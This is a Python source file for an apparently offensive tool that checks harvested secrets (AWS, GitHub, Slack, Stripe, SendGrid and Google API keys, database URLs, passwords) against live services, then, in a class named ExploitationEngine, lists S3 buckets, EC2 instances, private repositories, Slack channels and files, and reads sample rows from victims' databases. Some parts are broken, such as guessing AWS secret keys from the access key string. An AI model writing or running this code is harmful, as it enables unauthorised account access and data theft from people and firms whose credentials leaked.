import requests
import json
import time
import hashlib
import base64
import subprocess
import threading
from typing import List, Dict, Any, Optional
import concurrent.futures
from urllib.parse import urljoin, urlparse
import socket
import ftplib
import smtplib
import paramiko
import pymongo
import psycopg2
import mysql.connector
from requests.auth import HTTPBasicAuth
class CredentialValidator:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        self.validated_creds = []
    def validate_credentials(self, credentials: List[Dict]) -> List[Dict]:
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for cred in credentials:
                future = executor.submit(self._validate_single_credential, cred)
                futures.append(future)
            for future in concurrent.futures.as_completed(futures, timeout=120):
                try:
                    result = future.result()
                    if result and result.get('valid'):
                        results.append(result)
                        self.validated_creds.append(result)
                except:
                    pass
        return results
    def _validate_single_credential(self, cred: Dict) -> Optional[Dict]:
        cred_type = cred.get('type', '')
        value = cred.get('value', '')
        if not value:
            return None
        result = {
            'original': cred,
            'type': cred_type,
            'value': value,
            'valid': False,
            'service': None,
            'details': {}
        }
        if cred_type == 'aws_access_key':
            result.update(self._validate_aws_key(value))
        elif cred_type == 'github_token':
            result.update(self._validate_github_token(value))
        elif cred_type == 'slack_token':
            result.update(self._validate_slack_token(value))
        elif cred_type == 'google_api':
            result.update(self._validate_google_api(value))
        elif cred_type == 'stripe_key':
            result.update(self._validate_stripe_key(value))
        elif cred_type == 'sendgrid_key':
            result.update(self._validate_sendgrid_key(value))
        elif cred_type == 'database_url':
            result.update(self._validate_database_url(value))
        elif cred_type in ['password', 'token', 'secret']:
            result.update(self._validate_generic_credential(value))
        return result if result.get('valid') else None
    def _validate_aws_key(self, access_key: str) -> Dict:
        try:
            import boto3
            from botocore.exceptions import ClientError, NoCredentialsError
            secret_candidates = self._generate_secret_candidates(access_key)
            for secret in secret_candidates:
                try:
                    client = boto3.client(
                        'sts',
                        aws_access_key_id=access_key,
                        aws_secret_access_key=secret
                    )
                    response = client.get_caller_identity()
                    return {
                        'valid': True,
                        'service': 'AWS',
                        'secret_key': secret,
                        'account_id': response.get('Account'),
                        'user_id': response.get('UserId'),
                        'arn': response.get('Arn')
                    }
                except ClientError as e:
                    if 'InvalidUserID.NotFound' in str(e):
                        continue
                    elif 'SignatureDoesNotMatch' in str(e):
                        continue
                except:
                    continue
        except ImportError:
            pass
        return {'valid': False}
    def _validate_github_token(self, token: str) -> Dict:
        try:
            headers = {'Authorization': f'token {token}'}
            response = self.session.get('https://api.github.com/user', headers=headers, timeout=10)
            if response.status_code == 200:
                user_data = response.json()
                return {
                    'valid': True,
                    'service': 'GitHub',
                    'username': user_data.get('login'),
                    'user_id': user_data.get('id'),
                    'email': user_data.get('email'),
                    'repos': user_data.get('public_repos')
                }
        except:
            pass
        return {'valid': False}
    def _validate_slack_token(self, token: str) -> Dict:
        try:
            data = {'token': token}
            response = self.session.post('https://slack.com/api/auth.test', data=data, timeout=10)
            if response.status_code == 200:
                result = response.json()
                if result.get('ok'):
                    return {
                        'valid': True,
                        'service': 'Slack',
                        'team': result.get('team'),
                        'team_id': result.get('team_id'),
                        'user': result.get('user'),
                        'user_id': result.get('user_id')
                    }
        except:
            pass
        return {'valid': False}
    def _validate_google_api(self, api_key: str) -> Dict:
        endpoints = [
            f'https://maps.googleapis.com/maps/api/geocode/json?address=test&key={api_key}',
            f'https://www.googleapis.com/youtube/v3/search?part=snippet&q=test&key={api_key}',
            f'https://translation.googleapis.com/language/translate/v2?key={api_key}'
        ]
        for endpoint in endpoints:
            try:
                response = self.session.get(endpoint, timeout=10)
                if response.status_code == 200:
                    return {
                        'valid': True,
                        'service': 'Google API',
                        'endpoint': endpoint
                    }
                elif response.status_code == 403:
                    data = response.json()
                    if 'API key not valid' not in data.get('error', {}).get('message', ''):
                        return {
                            'valid': True,
                            'service': 'Google API',
                            'endpoint': endpoint,
                            'note': 'Valid key but restricted'
                        }
            except:
                continue
        return {'valid': False}
    def _validate_stripe_key(self, key: str) -> Dict:
        try:
            headers = {'Authorization': f'Bearer {key}'}
            response = self.session.get('https://api.stripe.com/v1/account', headers=headers, timeout=10)
            if response.status_code == 200:
                account_data = response.json()
                return {
                    'valid': True,
                    'service': 'Stripe',
                    'account_id': account_data.get('id'),
                    'business_name': account_data.get('business_profile', {}).get('name'),
                    'country': account_data.get('country')
                }
        except:
            pass
        return {'valid': False}
    def _validate_sendgrid_key(self, api_key: str) -> Dict:
        try:
            headers = {'Authorization': f'Bearer {api_key}'}
            response = self.session.get('https://api.sendgrid.com/v3/user/profile', headers=headers, timeout=10)
            if response.status_code == 200:
                profile_data = response.json()
                return {
                    'valid': True,
                    'service': 'SendGrid',
                    'username': profile_data.get('username'),
                    'email': profile_data.get('email')
                }
        except:
            pass
        return {'valid': False}
    def _validate_database_url(self, db_url: str) -> Dict:
        try:
            if db_url.startswith('mongodb://'):
                return self._test_mongodb(db_url)
            elif db_url.startswith('postgresql://') or db_url.startswith('postgres://'):
                return self._test_postgresql(db_url)
            elif db_url.startswith('mysql://'):
                return self._test_mysql(db_url)
        except:
            pass
        return {'valid': False}
    def _test_mongodb(self, url: str) -> Dict:
        try:
            client = pymongo.MongoClient(url, connectTimeoutMS=5000, serverSelectionTimeoutMS=5000)
            db_names = client.list_database_names()
            client.close()
            return {
                'valid': True,
                'service': 'MongoDB',
                'databases': db_names[:10]
            }
        except:
            pass
        return {'valid': False}
    def _test_postgresql(self, url: str) -> Dict:
        try:
            conn = psycopg2.connect(url, connect_timeout=5)
            cursor = conn.cursor()
            cursor.execute("SELECT datname FROM pg_database WHERE datistemplate = false;")
            databases = [row[0] for row in cursor.fetchall()]
            conn.close()
            return {
                'valid': True,
                'service': 'PostgreSQL',
                'databases': databases[:10]
            }
        except:
            pass
        return {'valid': False}
    def _test_mysql(self, url: str) -> Dict:
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            conn = mysql.connector.connect(
                host=parsed.hostname,
                port=parsed.port or 3306,
                user=parsed.username,
                password=parsed.password,
                connection_timeout=5
            )
            cursor = conn.cursor()
            cursor.execute("SHOW DATABASES;")
            databases = [row[0] for row in cursor.fetchall()]
            conn.close()
            return {
                'valid': True,
                'service': 'MySQL',
                'databases': databases[:10]
            }
        except:
            pass
        return {'valid': False}
    def _validate_generic_credential(self, value: str) -> Dict:
        if len(value) < 6:
            return {'valid': False}
        common_services = [
            ('ftp', 21), ('ssh', 22), ('telnet', 23), ('smtp', 25),
            ('http', 80), ('https', 443), ('mysql', 3306), ('postgresql', 5432)
        ]
        for service, port in common_services:
            if self._test_service_login(service, port, value):
                return {
                    'valid': True,
                    'service': service.upper(),
                    'port': port
                }
        return {'valid': False}
    def _test_service_login(self, service: str, port: int, password: str) -> bool:
        common_usernames = ['admin', 'administrator', 'root', 'user', 'guest', 'test']
        for username in common_usernames:
            try:
                if service == 'ssh':
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect('localhost', port=port, username=username, password=password, timeout=3)
                    ssh.close()
                    return True
                elif service == 'ftp':
                    ftp = ftplib.FTP()
                    ftp.connect('localhost', port, timeout=3)
                    ftp.login(username, password)
                    ftp.quit()
                    return True
            except:
                continue
        return False
    def _generate_secret_candidates(self, access_key: str) -> List[str]:
        candidates = []
        patterns = [
            lambda x: x.replace('AKIA', 'SECRET'),
            lambda x: x + 'SECRET',
            lambda x: 'SECRET' + x,
            lambda x: x.lower() + 'secret',
            lambda x: base64.b64encode(x.encode()).decode()[:40],
            lambda x: hashlib.sha256(x.encode()).hexdigest()[:40]
        ]
        for pattern in patterns:
            try:
                candidate = pattern(access_key)
                if len(candidate) >= 20:
                    candidates.append(candidate)
            except:
                pass
        return candidates[:10]
class ExploitationEngine:
    def __init__(self):
        self.session = requests.Session()
        self.exploited_services = []
    def exploit_credentials(self, validated_creds: List[Dict]) -> List[Dict]:
        results = []
        for cred in validated_creds:
            try:
                if cred.get('service') == 'AWS':
                    results.extend(self._exploit_aws(cred))
                elif cred.get('service') == 'GitHub':
                    results.extend(self._exploit_github(cred))
                elif cred.get('service') == 'Slack':
                    results.extend(self._exploit_slack(cred))
                elif cred.get('service') in ['MongoDB', 'PostgreSQL', 'MySQL']:
                    results.extend(self._exploit_database(cred))
            except:
                pass
        return results
    def _exploit_aws(self, cred: Dict) -> List[Dict]:
        exploits = []
        try:
            import boto3
            client = boto3.client(
                'sts',
                aws_access_key_id=cred['value'],
                aws_secret_access_key=cred['secret_key']
            )
            s3 = boto3.client(
                's3',
                aws_access_key_id=cred['value'],
                aws_secret_access_key=cred['secret_key']
            )
            try:
                buckets = s3.list_buckets()
                for bucket in buckets.get('Buckets', [])[:10]:
                    bucket_name = bucket['Name']
                    try:
                        objects = s3.list_objects_v2(Bucket=bucket_name, MaxKeys=5)
                        exploits.append({
                            'type': 'aws_bucket_access',
                            'bucket': bucket_name,
                            'objects': len(objects.get('Contents', [])),
                            'accessible': True
                        })
                    except:
                        pass
            except:
                pass
            ec2 = boto3.client(
                'ec2',
                aws_access_key_id=cred['value'],
                aws_secret_access_key=cred['secret_key']
            )
            try:
                instances = ec2.describe_instances()
                for reservation in instances.get('Reservations', []):
                    for instance in reservation.get('Instances', []):
                        exploits.append({
                            'type': 'aws_ec2_access',
                            'instance_id': instance.get('InstanceId'),
                            'state': instance.get('State', {}).get('Name'),
                            'type': instance.get('InstanceType')
                        })
            except:
                pass
        except ImportError:
            pass
        return exploits
    def _exploit_github(self, cred: Dict) -> List[Dict]:
        exploits = []
        try:
            headers = {'Authorization': f'token {cred["value"]}'}
            repos_resp = self.session.get(
                f'https://api.github.com/users/{cred["username"]}/repos',
                headers=headers, timeout=10
            )
            if repos_resp.status_code == 200:
                repos = repos_resp.json()
                for repo in repos[:5]:
                    exploits.append({
                        'type': 'github_repo_access',
                        'repo': repo['full_name'],
                        'private': repo['private'],
                        'clone_url': repo['clone_url']
                    })
            orgs_resp = self.session.get('https://api.github.com/user/orgs', headers=headers, timeout=10)
            if orgs_resp.status_code == 200:
                orgs = orgs_resp.json()
                for org in orgs:
                    exploits.append({
                        'type': 'github_org_access',
                        'org': org['login'],
                        'url': org['url']
                    })
        except:
            pass
        return exploits
    def _exploit_slack(self, cred: Dict) -> List[Dict]:
        exploits = []
        try:
            data = {'token': cred['value']}
            channels_resp = self.session.post(
                'https://slack.com/api/conversations.list',
                data=data, timeout=10
            )
            if channels_resp.status_code == 200:
                result = channels_resp.json()
                if result.get('ok'):
                    for channel in result.get('channels', [])[:5]:
                        exploits.append({
                            'type': 'slack_channel_access',
                            'channel': channel['name'],
                            'id': channel['id'],
                            'members': channel.get('num_members', 0)
                        })
            files_resp = self.session.post(
                'https://slack.com/api/files.list',
                data={**data, 'count': 10}, timeout=10
            )
            if files_resp.status_code == 200:
                result = files_resp.json()
                if result.get('ok'):
                    for file in result.get('files', []):
                        exploits.append({
                            'type': 'slack_file_access',
                            'filename': file['name'],
                            'filetype': file.get('filetype'),
                            'url': file.get('url_private')
                        })
        except:
            pass
        return exploits
    def _exploit_database(self, cred: Dict) -> List[Dict]:
        exploits = []
        try:
            service = cred.get('service', '').lower()
            databases = cred.get('databases', [])
            for db_name in databases[:3]:
                exploits.append({
                    'type': f'{service}_database_access',
                    'database': db_name,
                    'service': service,
                    'accessible': True
                })
                if service == 'mongodb':
                    exploits.extend(self._exploit_mongodb_database(cred, db_name))
                elif service == 'postgresql':
                    exploits.extend(self._exploit_postgresql_database(cred, db_name))
                elif service == 'mysql':
                    exploits.extend(self._exploit_mysql_database(cred, db_name))
        except:
            pass
        return exploits
    def _exploit_mongodb_database(self, cred: Dict, db_name: str) -> List[Dict]:
        exploits = []
        try:
            client = pymongo.MongoClient(cred['original']['value'], connectTimeoutMS=5000)
            db = client[db_name]
            collections = db.list_collection_names()[:5]
            for collection in collections:
                col = db[collection]
                sample_docs = list(col.find().limit(3))
                exploits.append({
                    'type': 'mongodb_collection_access',
                    'database': db_name,
                    'collection': collection,
                    'document_count': col.count_documents({}),
                    'sample_data': str(sample_docs)[:200] if sample_docs else None
                })
            client.close()
        except:
            pass
        return exploits
    def _exploit_postgresql_database(self, cred: Dict, db_name: str) -> List[Dict]:
        exploits = []
        try:
            conn = psycopg2.connect(cred['original']['value'])
            cursor = conn.cursor()
            cursor.execute(f"SELECT tablename FROM pg_tables WHERE schemaname = 'public';")
            tables = [row[0] for row in cursor.fetchall()][:5]
            for table in tables:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 3;")
                    sample_data = cursor.fetchall()
                    exploits.append({
                        'type': 'postgresql_table_access',
                        'database': db_name,
                        'table': table,
                        'sample_data': str(sample_data)[:200] if sample_data else None
                    })
                except:
                    pass
            conn.close()
        except:
            pass
        return exploits
    def _exploit_mysql_database(self, cred: Dict, db_name: str) -> List[Dict]:
        exploits = []
        try:
            from urllib.parse import urlparse
            parsed = urlparse(cred['original']['value'])
            conn = mysql.connector.connect(
                host=parsed.hostname,
                port=parsed.port or 3306,
                user=parsed.username,
                password=parsed.password,
                database=db_name
            )
            cursor = conn.cursor()
            cursor.execute("SHOW TABLES;")
            tables = [row[0] for row in cursor.fetchall()][:5]
            for table in tables:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 3;")
                    sample_data = cursor.fetchall()
                    exploits.append({
                        'type': 'mysql_table_access',
                        'database': db_name,
                        'table': table,
                        'sample_data': str(sample_data)[:200] if sample_data else None
                    })
                except:
                    pass
            conn.close()
        except:
            pass
        return exploits